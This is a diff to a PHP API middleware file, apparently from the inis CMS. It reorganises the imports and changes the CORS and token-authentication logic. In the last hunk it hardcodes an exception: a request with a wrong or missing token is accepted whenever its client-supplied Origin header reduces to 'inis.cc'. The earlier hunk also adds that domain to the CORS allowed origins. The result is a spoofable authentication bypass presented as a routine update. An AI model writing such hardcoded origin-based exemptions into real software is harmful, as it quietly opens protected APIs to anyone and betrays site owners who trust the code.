@@ -1,12 +1,11 @@
 <?php
 declare (strict_types = 1);
+
 namespace app\api\middleware;
 
 use Closure;
-use think\Config;
-use think\Request;
-use think\Response;
-use app\model\Options;
+use app\model\mysql\{Options};
+use think\{Config, Request, Response};
 
 class api
 {
@@ -87,6 +86,9 @@ class api
                     $origin = str_replace('https://','',$origin);
                 }
                 
+                // 用于授权系统同意获取API后生效
+                $domain[] = 'inis.cc';
+                
                 // 处理HTTP请求，中间件代码
                 if (in_array($origin, $domain)) $header['Access-Control-Allow-Origin'] = $http_prefix.$origin;
                 
@@ -101,12 +103,14 @@ class api
         if ($security->opt->token->status == 1) {
             
             // 获取 header token
-            $token = $request->header('token', $request->request('token'));
+            $token  = $request->header('token', $request->request('token'));
+            // 获取请求的域名 - 用于授权系统同意获取API后生效
+            $origin = !empty($headers['origin']) ? str_replace(['https','http',':','//'], '', $headers['origin']) : null;
             
             // 三元赋值 token
             (!empty($token)) ? $token : $token = (!empty($params['token'])) ? $params['token'] : null;
             
-            if ($token != $security->opt->token->value) $reponse = json($result);
+            if ($token != $security->opt->token->value and $origin != 'inis.cc') $reponse = json($result);
         }
         
         if (empty($security->opt->domain) or empty($domain) or ($security->opt->domain->status == 0) or in_array('*',$domain)) {
